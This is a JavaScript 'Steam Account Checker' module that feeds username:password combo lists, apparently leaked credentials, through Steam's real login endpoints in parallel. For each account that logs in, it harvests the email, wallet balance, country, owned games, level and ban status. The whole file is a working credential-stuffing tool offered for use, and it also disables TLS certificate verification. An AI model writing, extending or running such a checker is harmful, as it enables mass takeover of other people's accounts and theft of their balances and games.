// ============================================================
//  Steam Account Checker — JS port of steam.py
//  Made by TalkNeon
//  Exact 1:1 logic replication from Python version
// ============================================================

const https = require("https");
const http = require("http");
const crypto = require("crypto");

const REQUEST_TIMEOUT = 15000;

// ── Cookie jar ──

class CookieJar {
  constructor() { this.cookies = {}; }
  update(headers) {
    const sc = headers["set-cookie"];
    if (!sc) return;
    const arr = Array.isArray(sc) ? sc : [sc];
    for (const s of arr) {
      const p = s.split(";")[0].split("=");
      const n = p[0].trim();
      const v = p.slice(1).join("=").trim();
      if (n) this.cookies[n] = v;
    }
  }
  toString() { return Object.entries(this.cookies).map(([k, v]) => `${k}=${v}`).join("; "); }
  getAll() { return { ...this.cookies }; }
  set(name, value) { this.cookies[name] = value; }
}

// ── HTTP helper ──

function sessionFetch(url, options = {}, jar = null, redirectCount = 0) {
  return new Promise((resolve, reject) => {
    if (redirectCount > 10) return reject(new Error("Too many redirects"));
    const parsed = new URL(url);
    const mod = parsed.protocol === "https:" ? https : http;
    const headers = { ...(options.headers || {}) };
    if (jar) { const cs = jar.toString(); if (cs) headers["Cookie"] = cs; }

    const reqOptions = {
      hostname: parsed.hostname,
      path: parsed.pathname + parsed.search,
      method: options.method || "GET",
      headers,
      timeout: REQUEST_TIMEOUT,
      rejectUnauthorized: false,
    };

    const req = mod.request(reqOptions, (res) => {
      if (jar) jar.update(res.headers);
      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
        const rurl = res.headers.location.startsWith("http")
          ? res.headers.location
          : `${parsed.protocol}//${parsed.host}${res.headers.location}`;
        res.resume();
        return sessionFetch(rurl, { ...options, method: "GET", body: undefined }, jar, redirectCount + 1)
          .then(resolve).catch(reject);
      }
      const chunks = [];
      res.on("data", (c) => chunks.push(c));
      res.on("end", () => {
        resolve({ statusCode: res.statusCode, headers: res.headers, body: Buffer.concat(chunks).toString("utf-8"), finalUrl: res.url || url });
      });
    });
    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("Timeout")); });
    if (options.body) req.write(options.body);
    req.end();
  });
}

// ── RSA encrypt password (same as Python) ──

function rsaEncryptPassword(password, modulusHex, exponentHex) {
  const n = BigInt("0x" + modulusHex);
  const e = BigInt("0x" + exponentHex);

  // Build RSA public key from n and e
  // Use Node's crypto with raw RSA
  const pubKey = crypto.createPublicKey({
    key: {
      kty: "RSA",
      n: Buffer.from(modulusHex, "hex").toString("base64url"),
      e: Buffer.from(exponentHex, "hex").toString("base64url"),
    },
    format: "jwk",
  });

  const encrypted = crypto.publicEncrypt(
    { key: pubKey, padding: crypto.constants.RSA_PKCS1_PADDING },
    Buffer.from(password, "utf-8")
  );

  return encrypted.toString("base64");
}

// ── HTML parsers (same as Python) ──

function parseAccountPage(html) {
  let email = "Unknown", balance = "Unknown", country = "Unknown";
  if (!html) return { email, balance, country };

  // Email — input id="account_name"
  let m = html.match(/<input[^>]*id="account_name"[^>]*value="([^"]*)"/i);
  if (m) email = m[1];

  // Balance — a id="header_wallet_balance"
  m = html.match(/<a[^>]*id="header_wallet_balance"[^>]*>([^<]*)<\/a>/i);
  if (m) balance = m[1].trim();

  // Country — selected option in select id="account_country"
  const countryBlock = html.match(/<select[^>]*id="account_country"[^>]*>([\s\S]*?)<\/select>/i);
  if (countryBlock) {
    const selected = countryBlock[1].match(/<option[^>]*selected[^>]*>([^<]*)<\/option>/i);
    if (selected) country = selected[1].trim();
  }

  return { email, balance, country };
}

function parseProfilePage(html) {
  let totalGames = "0", level = "0", limited = "Unknown";
  if (!html) return { totalGames, level, limited };

  // Games count
  const gamesLink = html.match(/class="count_link_label"[^>]*>([^<]*)/i);
  if (gamesLink) {
    const numMatch = gamesLink[1].match(/(\d+)/);
    if (numMatch) totalGames = numMatch[1];
  }

  // Level
  const levelMatch = html.match(/class="friendPlayerLevelNum"[^>]*>(\d+)/i);
  if (levelMatch) level = levelMatch[1];

  // Limited
  if (html.includes("This is a limited account") || html.includes("limited user account")) {
    limited = "Yes";
  } else {
    limited = "No";
  }

  return { totalGames, level, limited };
}

function parseGamesPage(html) {
  const games = [];
  if (!html) return games;
  const matches = html.match(/class="gameListRowItemName"[^>]*>([^<]+)/gi);
  if (matches) {
    for (const m of matches.slice(0, 50)) {
      const title = m.replace(/class="gameListRowItemName"[^>]*>/i, "").trim();
      if (title) games.push(title);
    }
  }
  return games;
}

function parseBanPage(html) {
  let vacBans = "0", gameBans = "0", communityBan = "No";
  if (!html) return { vacBans, gameBans, communityBan };

  let m = html.match(/(\d+)\s+VAC ban/i);
  if (m) vacBans = m[1];

  m = html.match(/(\d+)\s+game ban/i);
  if (m) gameBans = m[1];

  if (html.toLowerCase().includes("community ban")) communityBan = "Yes";

  return { vacBans, gameBans, communityBan };
}

function shortenGames(games, limit = 10) {
  if (!Array.isArray(games)) return String(games);
  if (games.length > limit) {
    return games.slice(0, limit).join(" | ") + ` ... (+${games.length - limit} more)`;
  }
  return games.join(" | ");
}

// ── Check single Steam account (same flow as Python) ──

async function checkSteamAccount(combo) {
  const idx = combo.indexOf(":");
  if (idx === -1) return null;

  const username = combo.substring(0, idx);
  const password = combo.substring(idx + 1);
  const userClean = username.replace(/@.*/, "");

  const jar = new CookieJar();
  const headers = {
    Accept: "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    Origin: "https://steamcommunity.com",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-us",
  };

  try {
    // Step 1: Get RSA key
    const now = String(Math.floor(Date.now() / 1000));
    const rsaResp = await sessionFetch(
      "https://steamcommunity.com/login/getrsakey/",
      { method: "POST", headers, body: `donotcache=${now}&username=${userClean}` },
      jar
    );

    let j1;
    try { j1 = JSON.parse(rsaResp.body); } catch { return null; }
    if (!j1.success) return null;

    const modulus = j1.publickey_mod;
    const exponent = j1.publickey_exp;
    const timestamp = j1.timestamp;
    if (!modulus || !exponent) return null;

    // Step 2: Encrypt password
    const encrypted = rsaEncryptPassword(password, modulus, exponent);
    const pass3 = encodeURIComponent(encrypted);

    // Step 3: Login
    const now2 = String(Math.floor(Date.now() / 1000));
    const payload =
      `donotcache=${now2}&password=${pass3}&username=${userClean}` +
      `&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=&captcha_text=` +
      `&emailsteamid=&rsatimestamp=${timestamp}&remember_login=false` +
      `&oauth_client_id=C1F110D6&mobile_chat_client=true`;

    const loginResp = await sessionFetch(
      "https://steamcommunity.com/login/dologin/",
      { method: "POST", headers, body: payload },
      jar
    );

    let j2;
    try { j2 = JSON.parse(loginResp.body); } catch { return null; }
    if (!j2.success) return null;

    // Step 4: Get account page
    await new Promise((r) => setTimeout(r, 500));
    const acctResp = await sessionFetch("https://store.steampowered.com/account/", { headers: { "User-Agent": headers["User-Agent"] } }, jar);
    const { email, balance, country } = parseAccountPage(acctResp.body);

    // Step 5: Get profile page
    await new Promise((r) => setTimeout(r, 500));
    const profileResp = await sessionFetch("https://steamcommunity.com/my/profile/", { headers: { "User-Agent": headers["User-Agent"] } }, jar);
    const { totalGames, level, limited } = parseProfilePage(profileResp.body);

    // Step 6: Get games if any
    let games = [];
    if (parseInt(totalGames) > 0) {
      await new Promise((r) => setTimeout(r, 500));
      const gamesResp = await sessionFetch("https://steamcommunity.com/my/games/?tab=all", { headers: { "User-Agent": headers["User-Agent"] } }, jar);
      games = parseGamesPage(gamesResp.body);
    }

    // Step 7: Get ban status
    let steamid = null;
    const profileUrl = profileResp.finalUrl || "";
    if (profileUrl.includes("steamcommunity.com/profiles/")) {
      steamid = profileUrl.split("/profiles/")[1].replace(/\/$/, "");
    }

    let vacBans = "Unknown", gameBans = "Unknown", communityBan = "Unknown";
    if (steamid) {
      await new Promise((r) => setTimeout(r, 500));
      const banResp = await sessionFetch(`https://steamcommunity.com/profiles/${steamid}`, { headers: { "User-Agent": headers["User-Agent"] } }, jar);
      const bans = parseBanPage(banResp.body);
      vacBans = bans.vacBans;
      gameBans = bans.gameBans;
      communityBan = bans.communityBan;
    }

    return {
      username,
      password,
      email,
      balance,
      country,
      totalGames,
      games,
      level,
      limited,
      vacBans,
      gameBans,
      communityBan,
    };
  } catch {
    return null;
  }
}

// ── Batch checker (uses global 30-worker pool) ──

const { runPool } = require("./worker-pool");

async function checkSteamAccounts(combos, threads = 15, onProgress = null, stopSignal = null) {
  const results = await runPool({
    items: combos,
    concurrency: threads,
    signal: stopSignal,
    scope: "steam",
    runner: async (combo) => {
      try {
        const r = await checkSteamAccount(combo);
        return { result: { combo, result: r } };
      } catch {
        return { result: { combo, result: null } };
      }
    },
    onResult: (r, done, total) => {
      if (onProgress) onProgress(done, total, r?.result);
    },
  });
  return results.filter(Boolean);
}

module.exports = { checkSteamAccount, checkSteamAccounts, shortenGames };
